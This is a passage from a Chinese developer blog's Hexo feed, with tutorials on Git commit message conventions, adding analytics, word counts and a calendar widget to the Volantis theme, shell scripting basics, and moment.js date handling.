title="Header"></a>Header</h3><p>Header 部分只有一行，包括三个字段：<strong>type</strong>（必需）、<strong>scope</strong>（可选）和 <strong>subject</strong>（必需）。</p><p><strong>type</strong> 用于说明 <code>commit</code> 的类别，只允许使用下面 7 个标识。</p><ul><li><strong>feat</strong> 新功能（feature）</li><li><strong>fix</strong> 修补 bug</li><li><strong>docs</strong> 文档（documentation）</li><li><strong>style</strong> 格式（不影响代码运行的变动）</li><li><strong>refactor</strong> 重构（即不是新增功能，也不是修改 bug 的代码变动）</li><li><strong>test</strong> 增加测试</li><li><strong>chore</strong> 构建过程、辅助工具的变动</li><li><strong>perf</strong> 提高性能</li><li><strong>typo</strong> 打字错误</li></ul><p><strong>scope</strong> 用于说明 <code>commit</code> 影响的范围，比如数据层、控制层、视图层等等，视项目不同而不同。</p><p><strong>subject</strong> 是 <code>commit</code> 目的的简短描述，不超过 50 个字符。</p><h3 id="Body"><a href="#Body" class="headerlink" title="Body"></a>Body</h3><p>Body 部分是对本次 commit 的详细描述，可以分成多行。</p><h3 id="Footer"><a href="#Footer" class="headerlink" title="Footer"></a>Footer</h3><p>Footer 部分只用于不兼容变动和关闭 Issue。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>本来我自己一直使用的方式就是：<code>git commit -am &quot;fix login bug</code>，虽然并没有绝对的对错，但这显然不是最好的方式。</p><p>这种东西并没有强制性的规定，只要团队之间约定好，然后按照这个约定协作就好了。</p><p>所以我觉得在团队之间<code>commit</code>时，可以不用完全按照<code>Angular 规范的Commit message</code>格式去提交，可以按照以下约定来执行。</p><ul><li><code>commit</code>时，只用保留 Header 部分就好。</li><li><code>pull request</code>时，才需要 Header、Body、Footer 这三部分。</li></ul><p>另外<code>commit</code>时需要注意以下几点：</p><ul><li>创建短小而明确的<code>commit</code>，一句话说清楚。</li><li>一个小改动对应一次<code>commit</code>，不建议一大堆改动，一次<code>commit</code>。</li><li>如果添加的代码会使项目发生极大的变化，那么需要及时更新<code>remade</code>文件以向他人说明此次更改。</li></ul><h4 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docs: add FAQ in readme file</span><br><span class="line">feat: increase user login function</span><br><span class="line">fix: fix user login bug</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://ruby-china.org/topics/15737" target="_blank" rel="noopener">Git 如何写好 Commit Log？</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tutorial </tag>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo Volantis 主题优化 | 增加分析与统计</title>
      <link href="/hexo-volantis-theme-optimization-add-analysis-and-statistics/"/>
      <url>/hexo-volantis-theme-optimization-add-analysis-and-statistics/</url>
      
        <content type="html"><![CDATA[<p>Volantis 默认支持 <a href="http://busuanzi.ibruce.info/" target="_blank" rel="noopener">不蒜子</a> 的访问统计，可以自行添加<a href="https://tongji.baidu.com/" target="_blank" rel="noopener">百度统计</a>和 <a href="https://analytics.google.com/" target="_blank" rel="noopener">Google Analytics</a>。</p><a id="more"></a><h2 id="环境要求"><a href="#环境要求" class="headerlink" title="环境要求"></a>环境要求</h2><ul><li>Hexo：4.2</li><li>Node：12</li><li>Volantis：2.6</li></ul><h2 id="分析与统计"><a href="#分析与统计" class="headerlink" title="分析与统计"></a>分析与统计</h2><h3 id="字数和阅读时长"><a href="#字数和阅读时长" class="headerlink" title="字数和阅读时长"></a>字数和阅读时长</h3><ol><li>Volantis 默认没有安装 <code>wordcount</code>插件，所以需要手动安装：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i --save hexo-wordcount</span><br></pre></td></tr></table></figure><ol start="2"><li>修改主题配置文件<code>themes/volantis/_config.yml</code>，将 wordcount 插件打开</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">plugins:</span><br><span class="line">  ...</span><br><span class="line">  # 文章字数统计、阅读时长，开启需要安装插件: npm i --save hexo-wordcount</span><br><span class="line">  wordcount: true</span><br></pre></td></tr></table></figure><ol start="3"><li>继续修改主题配置文件<code>themes/volantis/_config.yml</code>，将 <code>wordcount</code> 放在需要显示的 meta 位置：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 布局</span><br><span class="line">layout:</span><br><span class="line">  on_list:</span><br><span class="line">    meta: [..., wordcount, ...]</span><br><span class="line">  on_page:</span><br><span class="line">    meta:</span><br><span class="line">      header: [..., wordcount, ...]</span><br><span class="line">      footer: [..., wordcount, ...]</span><br></pre></td></tr></table></figure><h3 id="百度统计"><a href="#百度统计" class="headerlink" title="百度统计"></a>百度统计</h3><p>百度统计是百度推出的一款免费的专业网站流量分析工具，能够告诉用户访客是如何找到并浏览用户的网站，在网站上做了些什么，非常有趣，接下来我们把百度统计添加到自己博客当中。</p><ol><li>访问<a href="https://tongji.baidu.com/" target="_blank" rel="noopener">百度统计首页</a>，注册一个账号后登陆，添加你的博客网站。</li></ol><p><img src="https://raw.githubusercontent.com/0xAiKang/CDN/master/blog/images/20200709204712.png" alt=""></p><ol start="2"><li><p>点击获取代码，复制该代码。</p></li><li><p>在主题配置文件中，增加以下内容：</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cnzz: true</span><br></pre></td></tr></table></figure><p>用于设置是否开启百度统计。</p><ol start="4"><li>在<code>themes/volantis/layout/_partial</code>目录下，新建一个<code>cnzz.ejs</code>文件，将刚才复制的内容粘贴进去：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;% if (theme.cnzz)&#123; %&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var _hmt &#x3D; _hmt || [];</span><br><span class="line">    (function () &#123;</span><br><span class="line">        var hm &#x3D; document.createElement(&quot;script&quot;);</span><br><span class="line">        hm.src &#x3D; &quot;https:&#x2F;&#x2F;hm.baidu.com&#x2F;hm.js?xxxxxxxxxxxxxxxxxxxxxxx&quot;;</span><br><span class="line">        var s &#x3D; document.getElementsByTagName(&quot;script&quot;)[0];</span><br><span class="line">        s.parentNode.insertBefore(hm, s);</span><br><span class="line">    &#125;)();</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><ol start="5"><li>最后将以下内容放在网站首页的尾部<code>themes/volantis/layout/_partial/footer.ejs</code>中：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- partial(&#39;cnzz&#39;) %&gt;</span><br></pre></td></tr></table></figure><p>完成以上所有操作之后，可以在<a href="https://tongji.baidu.com/sc-web/10000236600/home/site/index" target="_blank" rel="noopener">百度统计管理页面</a>检查代码是否安装正确，如果正确安装，通常二十分钟之后就可以看到网站的分析数据了。</p>]]></content>
      
      
      <categories>
          
          <category> Tutorial </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Tutorial </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo Volantis 主题优化 | 添加日历图</title>
      <link href="/hexo-volantis-theme-optimization-add-calendar/"/>
      <url>/hexo-volantis-theme-optimization-add-calendar/</url>
      
        <content type="html"><![CDATA[<p>一直觉得GitHub 日历图（代码提交统计样式）很好看，偶然发现是可以通过配置将日历模块引入到Hexo 的主题中的。</p><p>默认效果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200709204832.png" alt=""></p><p>因为我使用的Hexo 主题是<code>Volantis</code>、而该主题目前并没有集成该控件，所以需要手动配置。</p><a id="more"></a><h2 id="环境要求"><a href="#环境要求" class="headerlink" title="环境要求"></a>环境要求</h2><ul><li>Hexo：4.2</li><li>Node：12</li><li>Volantis：2.6</li></ul><p>Volantis 低版本可能会不适用于本文介绍的方法，可以参考 <code>YINUXY</code> 的 <a href="https://cloud.tencent.com/developer/article/1597223" target="_blank" rel="noopener">Hexo主题美化 | 给你的博客加上GITHUB日历云和分类</a></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><ol><li><p>在主题配置文件 <code>themes\volantis\_config.yml</code> 下添加以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">postCalendar: true</span><br></pre></td></tr></table></figure><p>用于设置在归档页面中是否显示’文章日历’控件，如果不想显示，设置为 <code>false</code> 即可。</p></li><li><p>在归档页面 <code>themes/volantis/layout/archive.ejs</code> 添加以下代码：</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;calendar&quot;&gt;</span><br><span class="line">&lt;% if (theme.postCalendar) &#123; %&gt;</span><br><span class="line">&lt;%- partial(&#39;_widget&#x2F;post-calendar&#39;) %&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><p>具体添加位置：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200709205348.png" alt="IMAGE"></p><p>这里会根据主题配置文件中的<code>postCalendar</code>的值，来判断是否需要渲染。</p><ol start="3"><li>点击下载日历样式文件 <code>post-calendar.ejs</code>，放置于<code>themes/volantis/layout/_widget</code>目录下。</li></ol><p>将其中的第 16 行，替换成以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;0xAiKang&#x2F;CDN@1.0&#x2F;blog&#x2F;js&#x2F;echarts.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>至此已经完成了，使用<code>hexo generate &amp;&amp; hexo server</code>查看是否可以正常加载日历图。</p><p>默认的样式是高仿<code>gittee</code>，如果觉得不满意，可以参考<a href="https://echarts.apache.org/zh/option.html#calendar" target="_blank" rel="noopener">官方文档</a>自定义。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://blog.csdn.net/cungudafa/article/details/106420842" target="_blank" rel="noopener">hexo（sakura）仿gitee添加文章贡献度日历图（echarts）</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tutorial </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Tutorial </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编写第一个Shell 脚本</title>
      <link href="/write-the-first-shell-script/"/>
      <url>/write-the-first-shell-script/</url>
      
        <content type="html"><![CDATA[<p>这篇笔记用来记录编写 Shell 脚本过程中的一些基础知识。</p><a id="more"></a><h2 id="什么是-shell-脚本"><a href="#什么是-shell-脚本" class="headerlink" title="什么是 shell 脚本"></a>什么是 shell 脚本</h2><blockquote><p><code>Shell</code> 脚本就是将一堆的 <code>Shell</code> 命令以及指定执行 <code>Shell</code> ，通过放在一个文件中来执行。</p></blockquote><h2 id="创建第一个shell-脚本"><a href="#创建第一个shell-脚本" class="headerlink" title="创建第一个shell 脚本"></a>创建第一个shell 脚本</h2><p>下面我们来创建第一个 shell 脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ vim showdate</span><br><span class="line"></span><br><span class="line">#! &#x2F;bin&#x2F;bash</span><br><span class="line"># this script displays the date and who&#39;s logged on</span><br><span class="line">date</span><br><span class="line">who</span><br></pre></td></tr></table></figure><p>大功告成！这样就完成了一个简单的 shell 脚本的创建，是不是很简单！不过有以下几点需要注意：</p><ol><li>shell 脚本的名称不是一定需要用 .sh 来结尾，只是用 .sh 结尾会让其他人一目了然知道这是一个 shell 脚本文件。</li><li>在创建shell 脚本时，必须在第一行指定要使用的 shell，且格式固定为：<code>#!</code>开头。</li><li>第二行的井号作为注释行。</li></ol><p>运行shell 脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ ls</span><br><span class="line">showdate</span><br><span class="line">$ .&#x2F;showdate</span><br><span class="line">bash: permission denied: .&#x2F;showdate</span><br><span class="line">$ sudo .&#x2F;showdate</span><br><span class="line">sudo: .&#x2F;showdate: command not found</span><br><span class="line">$ chmod u+x showdate</span><br><span class="line">$ .&#x2F;showdate</span><br></pre></td></tr></table></figure><p>创建完 shell 脚本，想要运行，有两种方案：</p><ol><li>将 shell 脚本所处的目录添加到 PATH 环境变量中;</li><li>在提示符中用绝对路径或者是相对路径来引用 shell 脚本文件;</li></ol><p>在上面的例子中，用的是绝对路径的方式来执行shell 脚本，使用单点操作符表示当前目录下的文件。</p><p>需要注意的是，因为文件夹权限的关系，而不能直接用 sudo 命令去执行，因为sudo 命令会检查showdate 并不在sudo 命令列表中。</p><p>所以正解是：修改该文件的文件夹权限。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对于Shell编程的理解</title>
      <link href="/understanding-of-shell-programming/"/>
      <url>/understanding-of-shell-programming/</url>
      
        <content type="html"><![CDATA[<p>在开始聊Shell编程之前，我们先来看看计算机编程语言的都有哪些类型。</p><p>计算机语言可以分为两大类：</p><ol><li>低级语言</li><li>高级语言</li></ol><a id="more"></a><p>低级语言包括：<strong>机器语言</strong>和<strong>汇编语言</strong>。</p><p>高级语言包括：<strong>静态语言</strong>和<strong>动态语言</strong>。</p><p>这里就不对机器语言和汇编语言做介绍了，今天的主角是高级语言下的动态语言。</p><h3 id="动态语言"><a href="#动态语言" class="headerlink" title="动态语言"></a>动态语言</h3><p><strong>动态语言又叫做脚本语言。</strong></p><p>它和传统的静态语言的区别就在于:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">前者的运行过程为：编写-&gt;解释-&gt;执行</span><br><span class="line">而后者的运行过程为：编写-&gt;编译-&gt;链接-&gt;执行</span><br></pre></td></tr></table></figure><p>脚本语言的优势就在于 只要有一个可以写代码的编辑器和能解释执行的脚本解释器就行了。</p><p>这样一想，也就明白了为什么搭建<code>Python</code>的开发环境远比<code>C#</code>要快，因为它只要安装一个解释器就好了。</p><blockquote><p>动态语言与静态语言存在的争议之一：</p></blockquote><p>在静态语言中，写代码时必须知道每个变量的类型; 而在动态语言中，随便什么时候，你都可以把变量设为任意类型的值。</p><h3 id="Shell编程"><a href="#Shell编程" class="headerlink" title="Shell编程"></a>Shell编程</h3><p>最初在学习<code>Shell</code>脚本时，产生过这样一个问题：<br><strong>为什么还能用<code>PHP</code>写<code>Shell</code>脚本？</strong></p><p>当时就很不理解。这里就反应了两个问题：</p><ol><li>对<code>PHP</code>的理解不深</li><li>对<code>Shell</code>脚本的理解不深</li></ol><p><strong>理论上讲，只要一门语言提供了解释器，这门语言就可以胜任脚本编程。</strong></p><p>所以用 <code>PHP</code> 可以写 <code>Shell</code> 脚本，就没有什么好奇怪的了。<br>你可能会问：这句话里面的 <code>Shell</code>怎么理解？</p><p>还记得吗，<code>Shell</code>的概念是什么？</p><blockquote><p><code>Shell</code> 脚本就是将一堆的 <code>Shell</code> 命令以及指定执行 <code>Shell</code> ，通过放在一个文件中来执行。</p></blockquote><h3 id="脚本语言的分类"><a href="#脚本语言的分类" class="headerlink" title="脚本语言的分类"></a>脚本语言的分类</h3><p>脚本语言又可以分为以下两大类：</p><ol><li><code>Shell</code>脚本</li><li>通用动态语言</li></ol><h5 id="常见的Shell脚本："><a href="#常见的Shell脚本：" class="headerlink" title="常见的Shell脚本："></a>常见的Shell脚本：</h5><ul><li>sh</li><li>bash</li><li>csh</li><li>ksh</li><li>tcsh</li><li>zsh</li><li>AppleScript </li></ul><h5 id="常见的脚本语言"><a href="#常见的脚本语言" class="headerlink" title="常见的脚本语言"></a>常见的脚本语言</h5><ul><li>JavaScript</li><li>Perl</li><li>PHP</li><li>Python</li><li>Ruby</li><li>VBScript</li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于Linux的Shell、Shell脚本、Shell环境的理解</title>
      <link href="/understanding-of-linux-shell-shell-script-shell-environment/"/>
      <url>/understanding-of-linux-shell-shell-script-shell-environment/</url>
      
        <content type="html"><![CDATA[<p>如标题所示，这片笔记主要目的是加深对<code>Linux</code>的<code>Shell</code>、<code>Shell脚本</code>、<code>Shell环境</code>的理解。</p><a id="more"></a><h2 id="什么是Shell？"><a href="#什么是Shell？" class="headerlink" title="什么是Shell？"></a>什么是Shell？</h2><ul><li><p>在回答这个问题之前，我们先来考虑一个问题：人是如何跟计算机打交道的？或者说怎样让计算机按照我们的要求完成某个任务？</p><ul><li>现在和计算机交互的方式很简单，直接用图形界面的工具就好了，想要计算机完成某个任务，通过操作图形界面的工具就能到达目的。</li><li>那么在以前呢？在那个计算机还没有这么先进的时代呢？人们又是如何让计算完成某个任务。通过“命令”的方式告诉计算机我需要你帮你完成这件事。这个“命令”又是怎么告诉计算机的呢？通过一个交互工具。这个工具可以实现与计算机之间的“你问我答，你说我做”的功能。</li></ul></li><li><p><code>Shell</code>就是一种应用程序（注意：我这里用的是一种）。</p></li><li><p>这个应用程序提供了一个界面（方便我们与计算机进行交互），用户通过这个界面访问操作系统内核的服务。</p></li></ul><h2 id="什么是Shell脚本？"><a href="#什么是Shell脚本？" class="headerlink" title="什么是Shell脚本？"></a>什么是Shell脚本？</h2><p><code>Shell</code> 脚本（<code>Shell Script</code>），是一种为 <code>Shell</code> 编写的脚本程序。</p><blockquote><p>Shell 脚本编程有两种方式</p></blockquote><ol><li>交互式（Interactive）：用户每输入一条命令就立即执行。</li><li>批处理（Batch）：由用户事先编写好一个完整的<code>Shell</code>脚本，<code>Shell</code>会一次性执行脚本中诸多的命令。</li></ol><h2 id="什么是Shell环境"><a href="#什么是Shell环境" class="headerlink" title="什么是Shell环境"></a>什么是Shell环境</h2><p><code>Shell</code>编程跟<code>java</code>、<code>php</code>编程一样，只要有一个<strong>能编写代码的文本编辑器</strong>和一个<strong>能解释执行的脚本解释器</strong>就可以了。</p><h3 id="0x01-Linux"><a href="#0x01-Linux" class="headerlink" title="0x01 Linux"></a>0x01 Linux</h3><ul><li><code>Linux</code> 默认安装了 <code>Shell</code> 解释器。</li><li>在<code>Linux</code>中，主流的 <code>Shell</code> 是 <code>Bash</code>。</li></ul><p>在一般情况下，人们并不区分 <code>Bourne Shell</code> 和 <code>Bourne Again Shell</code>，所以，像 <code>#!/bin/sh</code>，它同样也可以改为 <code>#!/bin/bash</code>。</p><h3 id="0x02-Mac-OS"><a href="#0x02-Mac-OS" class="headerlink" title="0x02 Mac OS"></a>0x02 Mac OS</h3><ul><li>Mac OS不仅带了sh、bash这两个最基础的解释器，还内置了ksh、csh、zsh等不常用的解释器。</li></ul><h3 id="0x03-Windows"><a href="#0x03-Windows" class="headerlink" title="0x03 Windows"></a>0x03 Windows</h3><p>Windows 出厂时没有内置 <code>Shell</code> 解释器，通常我们都是安装<code>cygwin</code>或者<code>mingw</code> 模拟器来Linux环境。</p><ul><li><a href="http://www.cygwin.com/" target="_blank" rel="noopener">Cygwin</a></li><li><a href="http://www.mingw.org/" target="_blank" rel="noopener">Mingw</a></li></ul><p>如Git的交互界面就是由<code>Mingw</code>模拟器提供的<code>Bash</code>。</p><h4 id="脚本解释器"><a href="#脚本解释器" class="headerlink" title="脚本解释器"></a>脚本解释器</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bash &#x3D;&gt; Bourne Again Shell（&#x2F;bin&#x2F;bash）</span><br><span class="line">sh &#x3D;&gt;  Bourne Shell（&#x2F;usr&#x2F;bin&#x2F;sh或&#x2F;bin&#x2F;sh）</span><br><span class="line">csh &#x3D;&gt; C Shell（&#x2F;usr&#x2F;bin&#x2F;csh）</span><br><span class="line">ksh &#x3D;&gt; K Shell（&#x2F;usr&#x2F;bin&#x2F;ksh）</span><br><span class="line">Shell for Root（&#x2F;sbin&#x2F;sh）</span><br></pre></td></tr></table></figure><h4 id="第一个Shell脚本"><a href="#第一个Shell脚本" class="headerlink" title="第一个Shell脚本"></a>第一个Shell脚本</h4><p>打开Bash或者任何一个文本编辑器，新建一个文件 Hello.sh，扩展名为<code>sh</code>(sh代表shell)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">#第一个Shell脚本</span><br><span class="line">#作用是列出当前目录下的所有文件的详情信息</span><br><span class="line">PWDS&#x3D;echo &#96;pwd&#96;</span><br><span class="line">cd $PWDS</span><br><span class="line">ls -l</span><br></pre></td></tr></table></figure><p>上面这个脚本中，有三种不同的元素：</p><ol><li>第一行的脚本声明（<code>#!</code>）用来告诉系统使用<strong>哪种 Shell 解释器</strong>来执行该脚本；</li><li>第二行的注释信息（<code>#</code>）是对脚本功能和某些命令的介绍信息，使得看到脚本时能快速反应是做什么的。</li><li>剩下没有前缀标识的就是 所要执行的脚本具体命令了。</li></ol><h4 id="运行Shell脚本"><a href="#运行Shell脚本" class="headerlink" title="运行Shell脚本"></a>运行Shell脚本</h4><p>有两种方式：</p><h5 id="1-作为可执行程序"><a href="#1-作为可执行程序" class="headerlink" title="1. 作为可执行程序"></a>1. 作为可执行程序</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ chmod +x example.sh    # 使脚本具有执行权限</span><br><span class="line">$ .&#x2F;example.sh           # 执行脚本</span><br></pre></td></tr></table></figure><h5 id="2-作为解释器参数"><a href="#2-作为解释器参数" class="headerlink" title="2. 作为解释器参数"></a>2. 作为解释器参数</h5><p>这种运行方式是，直接运行解释器，其参数就是shell脚本的文件名:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 执行脚本</span><br><span class="line">$ &#x2F;bin&#x2F;sh example.sh</span><br><span class="line">$ bash example.sh</span><br><span class="line">$ bash example.php</span><br></pre></td></tr></table></figure><p>使用这种方式时，可以不用在脚本第一行声明解释器信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ cat example.php</span><br><span class="line">#这是一个用php写的Shell脚本，有两个作用</span><br><span class="line">#1.确认是否用解释器参数执行shell脚本可以不用写声明</span><br><span class="line">#2.确认如何用php写shell脚本</span><br><span class="line">string&#x3D;&quot;php shell&quot;</span><br><span class="line">echo $string</span><br><span class="line">$ bash example.php</span><br><span class="line">php shell</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>moment.js 用法总结</title>
      <link href="/moment-js-usage-summary/"/>
      <url>/moment-js-usage-summary/</url>
      
        <content type="html"><![CDATA[<p>最近在做的一个前端项目，经常会遇到对时间的处理，因为原生的时间格式处理起来很费劲，所以引入了一个轻量级的日期处理类库。</p><p><a href="http://momentjs.cn/" target="_blank" rel="noopener">momentjs</a> 支持日期格式化、Date、时间戳等相互转换，它使得操作时间变得非常简单。</p><a id="more"></a><h3 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h3><p><code>momentjs</code>支持多个环境，所有的代码都应该在这两种环境中都可以工作。</p><h4 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install moment</span><br><span class="line">var moment &#x3D; require(&#39;moment&#39;);</span><br></pre></td></tr></table></figure><h4 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.bootcss.com&#x2F;moment.js&#x2F;2.9.0&#x2F;moment.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>获取当前的日期和时间：</p><h4 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moment();</span><br></pre></td></tr></table></figure><p>相当于moment(new Date()) 此处会返回一个moment封装的<strong>日期对象</strong>。</p><p><img src="https://raw.githubusercontent.com/0xAiKang/CDN/master/blog/images/20200707190535.png" alt=""></p><h4 id="格式化"><a href="#格式化" class="headerlink" title="格式化"></a>格式化</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">moment().format(&#39;YYYY年MM月DD日 HH:mm:ss&#39;) &#x2F;&#x2F; &quot;2020年07月07日 07:49:38&quot;</span><br><span class="line">moment().format(&#39;YYYY-MM-DD HH:mm:ss&#39;) &#x2F;&#x2F; &quot;2020-07-07 07:50:57&quot;</span><br><span class="line">moment().format(&#39;YYYY&#x2F;MM&#x2F;DD HH:mm:ss&#39;) &#x2F;&#x2F; &quot;2020&#x2F;07&#x2F;07 07:51:17&quot;</span><br><span class="line">moment().format(&#39;hh:m:ss&#39;) &#x2F;&#x2F; &quot;07:51:34&quot;</span><br><span class="line">moment().format(&#39;YYYY&#39;) &#x2F;&#x2F; &quot;2020&quot;</span><br><span class="line">moment().format(&#39;d&#39;) &#x2F;&#x2F; 2，今天是周二</span><br><span class="line">moment().format(&#39;X&#39;) &#x2F;&#x2F; 获取当前时间的Unix时间戳</span><br></pre></td></tr></table></figure><h4 id="转换为Date对象"><a href="#转换为Date对象" class="headerlink" title="转换为Date对象"></a>转换为Date对象</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">moment().toDate() &#x2F;&#x2F; Mon Jan 22 2018 18:11:55 GMT+0800 (中国标准时间)</span><br><span class="line">moment(&#39;2018-01-20&#39;).toDate() &#x2F;&#x2F; Tue Jan 20 2015 00:00:00 GMT+0800 (中国标准时间)</span><br><span class="line">moment(&#39;2018-01-22 10:20:15&#39;).toDate() &#x2F;&#x2F; Mon Jan 22 2018 10:20:15 GMT+0800 (中国标准时间)</span><br><span class="line">moment(1448896064621).toDate() &#x2F;&#x2F;毫秒转日期</span><br></pre></td></tr></table></figure><h4 id="获取时间信息"><a href="#获取时间信息" class="headerlink" title="获取时间信息"></a>获取时间信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">moment().second() &#x2F;&#x2F; 获取当前这一分钟的多少秒</span><br><span class="line">moment().date() &#x2F;&#x2F; 